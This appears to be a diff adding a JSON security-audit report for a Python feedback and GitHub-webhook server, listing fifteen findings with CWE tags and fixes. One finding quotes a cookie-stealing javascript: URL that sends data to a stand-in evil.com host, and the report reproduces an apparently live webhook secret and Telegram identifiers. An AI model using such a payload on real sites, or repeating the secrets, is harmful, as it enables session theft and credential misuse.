@@ -1,0 +1,161 @@
+{
+  "status": "changes_required",
+  "summary": {
+    "totalFindings": 15,
+    "critical": 3,
+    "major": 6,
+    "minor": 6
+  },
+  "findings": [
+    {
+      "severity": "critical",
+      "category": "Hardcoded Secrets",
+      "title": "Webhook secret committed to version-controlled .env file",
+      "description": "The file scripts/.env contains a real GH_WEBHOOK_SECRET value ('gzQgLFkHVpsRLPkhnJjbHPtJCRxK') committed to the repository. Anyone with read access to the repo can forge GitHub webhook requests. The private key PEM path also lives in this file and the PEM file itself sits in the same scripts/ directory.",
+      "location": "scripts/.env:3",
+      "impact": "An attacker who reads scripts/.env can compute valid X-Hub-Signature-256 values for arbitrary payloads, bypassing the only authentication mechanism protecting the webhook endpoint. They can then inject fake installation/push events and trigger Telegram notifications under any identity.",
+      "recommendation": "Remove scripts/.env from version control immediately (add to .gitignore). Rotate GH_WEBHOOK_SECRET and the GitHub App private key. Store secrets exclusively in environment variables injected by the process manager at runtime, never on disk in the repo tree.",
+      "cwe": "CWE-312"
+    },
+    {
+      "severity": "critical",
+      "category": "A01: Broken Access Control",
+      "title": "Webhook signature verification disabled when GH_WEBHOOK_SECRET is empty",
+      "description": "verify_github_signature() (line 108-115) returns True unconditionally when GH_WEBHOOK_SECRET is falsy: 'if not GH_WEBHOOK_SECRET: return True'. If the secret is not configured (empty string, missing env var), every POST to /github/webhook is accepted with no authentication. This also means any startup-time misconfiguration silently removes the only access control on the webhook endpoint.",
+      "location": "scripts/feedback-server.py:108-109",
+      "impact": "Any internet-accessible client can POST crafted installation or push events. Consequences include: spam Telegram notifications, poisoning of _app_installations and _setup_data in-memory state, and potential DoS of the review queue counter.",
+      "recommendation": "Fail closed: raise an exception (or return False) when GH_WEBHOOK_SECRET is not configured, rather than allowing unauthenticated access. Example:\n\n  if not GH_WEBHOOK_SECRET:\n      return False  # misconfigured — reject all webhooks\n\nAdd startup validation that aborts the process if required secrets are absent.",
+      "cwe": "CWE-287"
+    },
+    {
+      "severity": "critical",
+      "category": "A10: SSRF",
+      "title": "Unvalidated user-supplied repo URL used in server-side GitHub API request",
+      "description": "_handle_feedback() (lines 376-389) takes the 'repo' field from untrusted user POST body and constructs a URL: 'https://api.github.com/repos/{repo_path}/commits?per_page=5'. The only guard is 'if \"/\" in repo_path and not repo_path.startswith(\"http\")'. This check can be bypassed with paths like '../../anything' or URLs with unicode lookalikes. The repo field is capped at 500 chars but not otherwise sanitized. The same pattern appears in _handle_review() (line 434) building repo_url and commit_url, and in check_access_status() running subprocess gh api with the repo name.",
+      "location": "scripts/feedback-server.py:376-389, 434, 151-158",
+      "impact": "A crafted repo value could reach unintended GitHub API endpoints (path traversal in URL). More critically, in check_access_status() the repo_full_name is passed unsanitized as a shell argument to 'gh api /repos/{repo_full_name}/collaborators/...' — if gh expands it before the OS shell processes it, and depending on gh version, additional arguments or path segments could be injected.",
+      "recommendation": "Validate repo values with a strict allowlist regex before use:\n\n  import re\n  REPO_RE = re.compile(r'^[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+$')\n  if not REPO_RE.match(repo_path):\n      # reject\n\nFor subprocess calls, pass repo components as separate list elements and never via string interpolation into the path.",
+      "cwe": "CWE-918"
+    },
+    {
+      "severity": "major",
+      "category": "A01: Broken Access Control",
+      "title": "/admin/installs endpoint relies solely on nginx basic auth with no server-side enforcement",
+      "description": "_handle_admin_installs() (lines 500-554) sends sensitive HTML — installation accounts, spec URLs, Figma URLs, Telegram usernames — with no authentication check in the Python handler itself. The server trusts that nginx upstream enforces basic auth. If the port (3847) is ever directly reachable (firewall misconfiguration, internal network access), the admin page is completely unprotected. The server binds on 127.0.0.1 (line 781) which mitigates this partially, but internal actors or SSRF vectors can still reach it.",
+      "location": "scripts/feedback-server.py:500-554",
+      "impact": "Exposure of all customer installation data: GitHub accounts, spec document URLs, Figma links, Telegram usernames.",
+      "recommendation": "Add a server-side token check in _handle_admin_installs(). Read an ADMIN_TOKEN env var and require it as a Bearer token or query parameter. Defense in depth should not rely solely on a reverse proxy.",
+      "cwe": "CWE-306"
+    },
+    {
+      "severity": "major",
+      "category": "A03: Injection",
+      "title": "Stored XSS in /admin/installs HTML response via unsanitized setup data",
+      "description": "_handle_admin_installs() (lines 512-520) renders stored values from _setup_data directly into HTML without escaping: account, repos, spec_url, figma_url, telegram, saved_at. For example:\n\n  spec_html = f'<a href=\"{spec}\" target=\"_blank\">link</a>' if spec else \"—\"\n\nA user who submits spec_url='javascript:alert(1)' or telegram='<script>...</script>' via /github/setup will have that value stored and then rendered unescaped in the admin panel HTML.",
+      "location": "scripts/feedback-server.py:512-520",
+      "impact": "Stored XSS in the admin panel. An attacker who installs the GitHub App can inject arbitrary JavaScript that executes in the admin's browser, potentially stealing credentials or performing actions as the admin.",
+      "recommendation": "HTML-escape all data before rendering in HTML. Use Python's html.escape():\n\n  import html\n  tg = html.escape(setup.get('telegram', ''))\n  account = html.escape(account)\n\nFor URLs in href attributes, validate that spec and figma values start with 'https://' before rendering as links; otherwise render as plain escaped text.",
+      "cwe": "CWE-79"
+    },
+    {
+      "severity": "major",
+      "category": "A03: Injection",
+      "title": "Open redirect / javascript: URI injection via spec_url and figma_url in admin HTML",
+      "description": "spec_html and figma_html are built directly from stored URLs with no scheme validation (lines 512-513). A value like 'javascript:fetch(\"//evil.com/?\"+document.cookie)' or 'data:text/html,...' stored by a user and rendered in the admin page results in a clickable malicious link in the admin panel.",
+      "location": "scripts/feedback-server.py:512-513",
+      "impact": "Admin clicks a 'link' in the install table and executes attacker-controlled JavaScript or is redirected to a phishing page.",
+      "recommendation": "Validate URLs before rendering as <a href>. Accept only 'https://' scheme:\n\n  def safe_link(url, label='link'):\n      import html\n      if url and url.startswith('https://'):\n          return f'<a href=\"{html.escape(url)}\" target=\"_blank\" rel=\"noopener noreferrer\">{label}</a>'\n      return html.escape(url) if url else '—'",
+      "cwe": "CWE-601"
+    },
+    {
+      "severity": "major",
+      "category": "A04: Insecure Design",
+      "title": "Rate limiting uses client-supplied X-Real-IP header, enabling bypass",
+      "description": "_read_json_body() (line 229) reads the client IP as:\n\n  client_ip = self.headers.get(\"X-Real-IP\", self.client_address[0])\n\nThe X-Real-IP header is taken at face value from the HTTP request. An attacker can set X-Real-IP: 1.2.3.4 to a new spoofed IP on every request, completely bypassing the 5-requests-per-minute rate limit while the real IP never appears in RATE_LIMIT.",
+      "location": "scripts/feedback-server.py:229",
+      "impact": "Rate limiting is ineffective. Attackers can spam /feedback, /review, and /github/setup with no throttling, potentially flooding the Telegram channel or causing DoS.",
+      "recommendation": "Only trust X-Real-IP / X-Forwarded-For if requests arrive from a known trusted proxy (i.e., the nginx proxy at localhost). Use self.client_address[0] as the authoritative IP, since the server binds on 127.0.0.1 and legitimate requests come only through nginx:\n\n  client_ip = self.client_address[0]  # always the nginx proxy IP in production",
+      "cwe": "CWE-807"
+    },
+    {
+      "severity": "major",
+      "category": "A09: Security Logging and Monitoring",
+      "title": "Credentials field logged and forwarded to Telegram in plaintext",
+      "description": "_handle_review() (lines 430, 477) accepts a 'creds' field from any caller and forwards it verbatim to Telegram:\n\n  creds = self._str_field(data, \"creds\", 1000)\n  ...\n  tg_text += f\"\\n**Credentials:**\\n```\\n{creds[:500]}\\n```\\n\"\n\nThere is no validation of what 'creds' contains, no audit log, and no redaction. The Telegram channel receiving these messages becomes a credential store.",
+      "location": "scripts/feedback-server.py:430, 477",
+      "impact": "Real credentials (passwords, tokens, API keys) submitted by CI/CD integrations are transmitted over Telegram and stored in Telegram chat history indefinitely. If the Telegram account or chat is compromised, all submitted credentials are exposed.",
+      "recommendation": "At minimum, redact credentials in logs and add explicit warnings in documentation that this field should only contain test/dummy credentials. Ideally, remove the field or route it through a secrets manager rather than Telegram.",
+      "cwe": "CWE-532"
+    },
+    {
+      "severity": "minor",
+      "category": "A02: Cryptographic Failures",
+      "title": "TELEGRAM_API_ID hardcoded in source with a real default value",
+      "description": "Line 22 contains:\n\n  TELEGRAM_API_ID = int(os.environ.get(\"TELEGRAM_API_ID\", \"20663119\"))\n\nA real Telegram API ID is hardcoded as the default. Similarly, TELEGRAM_CHAT_ID defaults to '-5058393445' and TELEGRAM_REVIEW_CHAT_ID defaults to a real chat ID. While API ID alone is not sufficient to authenticate, committing production identifiers makes it easier for an attacker who obtains the session string to pivot to the correct resources.",
+      "location": "scripts/feedback-server.py:22, 25, 26",
+      "impact": "Enumeration of internal Telegram infrastructure. Combined with a leaked session string, enables direct targeting of the production Telegram account and chats.",
+      "recommendation": "Remove all real default values. Use empty string '' or 0 as defaults and add startup validation that fails loudly if required values are missing.",
+      "cwe": "CWE-312"
+    },
+    {
+      "severity": "minor",
+      "category": "A05: Security Misconfiguration",
+      "title": "CORS configured as wildcard Access-Control-Allow-Origin: *",
+      "description": "_cors_headers() (lines 760-764) sends:\n\n  Access-Control-Allow-Origin: *\n\non all responses, including /github/setup which writes user data to persistent storage. While this endpoint requires a POST with JSON (providing some CSRF protection via the pre-flight requirement), the wildcard origin allows any web page to make cross-origin requests to this server.",
+      "location": "scripts/feedback-server.py:760-764",
+      "impact": "Any web page can POST to /github/setup or /feedback without restriction. Combined with the rate-limit bypass (X-Real-IP), this enables cross-origin spam.",
+      "recommendation": "Restrict CORS to known origins. If the setup page is served from a specific domain, set:\n\n  Access-Control-Allow-Origin: https://yourdomain.example.com\n\nIf multiple origins are needed, validate the Origin header against an allowlist.",
+      "cwe": "CWE-942"
+    },
+    {
+      "severity": "minor",
+      "category": "A05: Security Misconfiguration",
+      "title": "Missing security headers on admin HTML response",
+      "description": "_handle_admin_installs() (lines 549-554) sends only Content-Type and Content-Length headers. Missing headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy. Without CSP, inline scripts injected via XSS (see finding on stored XSS) execute freely.",
+      "location": "scripts/feedback-server.py:549-554",
+      "impact": "Reduces effectiveness of XSS mitigations. Lack of X-Frame-Options allows clickjacking of the admin interface.",
+      "recommendation": "Add to the admin HTML response:\n\n  self.send_header('Content-Security-Policy', \"default-src 'none'; style-src 'unsafe-inline'; script-src 'none'\")\n  self.send_header('X-Frame-Options', 'DENY')\n  self.send_header('X-Content-Type-Options', 'nosniff')\n  self.send_header('Referrer-Policy', 'no-referrer')",
+      "cwe": "CWE-693"
+    },
+    {
+      "severity": "minor",
+      "category": "A01: Broken Access Control",
+      "title": "Installation ID accepted from unauthenticated user in /github/setup",
+      "description": "_handle_github_setup() (lines 561-606) accepts installation_id from the POST body:\n\n  iid_raw = data.get('installation_id', '')\n\nsetup.html reads it from the URL query string (line 137: getInstallationId()). Any user who knows or guesses another installation's numeric ID can overwrite that installation's spec_url, figma_url, and telegram fields in setup-data.json.",
+      "location": "scripts/feedback-server.py:561-563; setup.html:137",
+      "impact": "Horizontal privilege escalation: attacker can corrupt or poison setup data for any other GitHub App installation, changing the spec/Figma URLs that reviewers use.",
+      "recommendation": "Verify that the installation_id belongs to the requester. The cleanest approach: after the GitHub App OAuth redirect, GitHub includes a state parameter and installation_id. Validate these server-side using a signed token (e.g., HMAC of installation_id with GH_WEBHOOK_SECRET) that is embedded in the redirect URL and verified on submission.",
+      "cwe": "CWE-639"
+    },
+    {
+      "severity": "minor",
+      "category": "A04: Insecure Design",
+      "title": "In-memory state for installations lost on server restart — creates silent data loss",
+      "description": "_app_installations (line 42) stores installation data in a plain Python dict. Server restarts (PM2 autorestart is enabled) clear this data entirely. _handle_admin_installs() merges from both the in-memory dict and _setup_data, but the repos field for each installation only exists in memory. After a restart, all repo lists show '—'.",
+      "location": "scripts/feedback-server.py:42, 500-507",
+      "impact": "Operational issue that could cause reviewers to miss which repos belong to which installation. Not directly exploitable, but creates inconsistent state that could mask security events.",
+      "recommendation": "Persist _app_installations to setup-data.json alongside setup data, using the same _save_setup_data mechanism. Merge on load.",
+      "cwe": "CWE-400"
+    },
+    {
+      "severity": "minor",
+      "category": "A08: Software and Data Integrity",
+      "title": "setup-data.json written without atomic rename — susceptible to partial writes",
+      "description": "_save_setup_data() (lines 54-59) writes the file with open(_SETUP_FILE, 'w'). If the process is killed mid-write (PM2 restart, OOM), the JSON file is left in a truncated/corrupted state. On next load, _load_setup_data() silently returns {} and all setup data is lost.",
+      "location": "scripts/feedback-server.py:54-59",
+      "impact": "Data loss of all customer setup information on any unclean shutdown.",
+      "recommendation": "Use atomic writes via a temporary file and os.replace():\n\n  import tempfile\n  tmp = _SETUP_FILE + '.tmp'\n  with open(tmp, 'w') as f:\n      json.dump(data, f, indent=2)\n  os.replace(tmp, _SETUP_FILE)",
+      "cwe": "CWE-362"
+    },
+    {
+      "severity": "minor",
+      "category": "A09: Security Logging and Monitoring",
+      "title": "No audit logging for security-relevant events",
+      "description": "The server has no structured logging for: authentication failures (invalid webhook signature at line 629), rate limit violations (line 230-235), admin endpoint access (line 500), or setup data mutations (line 585). The only logging is print() calls (lines 93, 96, etc.) which go to PM2 stdout without timestamps, log levels, or structured fields.",
+      "location": "scripts/feedback-server.py:629, 230, 500, 585",
+      "impact": "Incidents cannot be investigated after the fact. Failed signature verifications (potential attack probes) are invisible. Rate limit bypass attempts leave no trace.",
+      "recommendation": "Use Python's logging module with a structured formatter. At minimum log: timestamp, event type, source IP, and outcome for all security decision points. Example:\n\n  import logging\n  logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')\n  logger = logging.getLogger('feedback-server')\n  logger.warning('invalid_webhook_signature ip=%s', client_ip)",
+      "cwe": "CWE-778"
+    }
+  ]
+}
